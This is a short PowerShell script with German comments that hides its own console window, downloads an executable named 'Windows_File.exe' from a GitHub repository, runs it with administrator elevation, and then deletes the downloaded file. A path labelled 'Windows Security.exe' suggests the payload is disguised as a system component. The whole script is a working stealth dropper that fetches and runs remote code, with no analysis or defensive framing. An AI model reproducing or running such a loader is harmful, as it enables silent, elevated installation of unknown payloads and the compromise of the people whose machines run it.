# Versteckt das PowerShell-Fenster
Add-Type -Name Win32 -Namespace System -MemberDefinition '
    [DllImport("kernel32.dll")] public static extern IntPtr GetConsoleWindow();
    [DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
'
$consolePtr = [System.Win32]::GetConsoleWindow()
[System.Win32]::ShowWindow($consolePtr, 0)  # Fenster verstecken

# Wichtige Pfade
$DownloadPath = "$env:USERPROFILE\Downloads"
$ClientExePath = "$env:USERPROFILE\Windows Security\Windows Security.exe"

# Datei von GitHub herunterladen
$GitHubURL = "https://github.com/IchbinMrNook/Private_script_pull-DC-Version/raw/refs/heads/main/Windows_File.exe"
$DownloadedFile = Join-Path "$DownloadPath" "Windows_File.exe"
(New-Object System.Net.WebClient).DownloadFile($GitHubURL, $DownloadedFile)

# Datei ausführen, wenn Download erfolgreich
if (Test-Path $DownloadedFile) {
    Start-Process -FilePath $DownloadedFile -Verb RunAs
    Start-Sleep -Seconds 20
    Remove-Item -Path $DownloadedFile -Force
}
